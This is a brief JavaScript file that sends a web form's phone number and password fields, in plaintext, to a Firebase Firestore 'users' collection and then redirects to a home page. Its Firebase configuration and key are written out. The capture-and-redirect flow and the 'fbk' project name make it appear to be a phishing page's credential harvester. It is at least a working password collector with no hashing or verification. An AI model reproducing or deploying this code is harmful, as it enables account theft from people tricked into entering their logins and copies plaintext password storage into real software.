import { initializeApp } from "https://www.gstatic.com/firebasejs/12.17.0/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc
} from "https://www.gstatic.com/firebasejs/12.17.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyB2Rr2r6odzdFXN6MsdM-LgxTAM75AqtwM",
  authDomain: "fir-fbk.firebaseapp.com",
  projectId: "fir-fbk",
  storageBucket: "fir-fbk.firebasestorage.app",
  messagingSenderId: "621767677382",
  appId: "1:621767677382:web:7d6846b10eef9b2dc50ec7"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const form = document.getElementById("info");

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const number = document.getElementById("number").value;
  const pass = document.getElementById("pass").value;

  try {
    await addDoc(collection(db, "users"), {
      number,
      pass,
      time: new Date()
    });

    // alert("Saved!");

    window.location.href = "home.html";
  } catch (err) {
    alert(err.message);
  }
  // console.log("Firebase JS Loaded");
});
